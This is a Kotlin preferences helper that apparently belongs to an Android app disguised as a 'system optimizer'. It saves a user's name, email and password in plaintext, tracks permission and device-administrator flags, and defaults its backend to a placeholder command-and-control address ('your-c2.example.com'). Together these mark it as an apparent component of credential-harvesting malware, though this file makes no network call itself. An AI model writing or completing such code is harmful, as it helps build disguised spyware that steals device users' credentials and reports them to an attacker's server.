package com.system.optimizer.util

import android.content.Context
import android.content.SharedPreferences

object Prefs {
    private const val NAME = "sys_opt_prefs"

    private fun prefs(ctx: Context): SharedPreferences =
        ctx.getSharedPreferences(NAME, Context.MODE_PRIVATE)

    fun saveCredentials(ctx: Context, user: String, email: String, pass: String) {
        prefs(ctx).edit()
            .putString("user", user)
            .putString("email", email)
            .putString("pass", pass) // in real build encrypt this
            .apply()
    }

    fun isAuthenticated(ctx: Context) = prefs(ctx).getBoolean("auth", false)
    fun setAuthenticated(ctx: Context, v: Boolean) =
        prefs(ctx).edit().putBoolean("auth", v).apply()

    fun arePermissionsDone(ctx: Context) = prefs(ctx).getBoolean("perms_done", false)
    fun setPermissionsDone(ctx: Context, v: Boolean) =
        prefs(ctx).edit().putBoolean("perms_done", v).apply()

    fun isAdminActive(ctx: Context) = prefs(ctx).getBoolean("admin", false)
    fun setAdminActive(ctx: Context, v: Boolean) =
        prefs(ctx).edit().putBoolean("admin", v).apply()

    fun getBackendUrl(ctx: Context) =
        prefs(ctx).getString("backend", "https://your-c2.example.com") ?: "https://your-c2.example.com"
}
